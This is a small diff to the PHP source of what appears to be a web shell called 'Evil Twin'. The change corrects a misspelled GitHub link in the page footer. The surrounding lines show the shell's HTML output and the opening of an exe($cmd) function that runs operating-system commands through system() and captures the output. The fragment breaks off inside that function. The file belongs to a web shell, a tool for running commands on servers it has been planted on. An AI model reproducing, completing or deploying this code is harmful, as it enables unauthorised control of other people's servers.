@@ -403,7 +403,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo "<br><center><a href='https://githuh.com/eviltwin-dev/eviltwin-shell'>&copy; Evil Twin</a></center></body></html>";
+echo "<br><center><a href='https://github.com/eviltwin-dev/eviltwin-shell'>&copy; Evil Twin</a></center></body></html>";
 function exe($cmd) { 	
 if(function_exists('system')) { 		
 		@ob_start(); 		
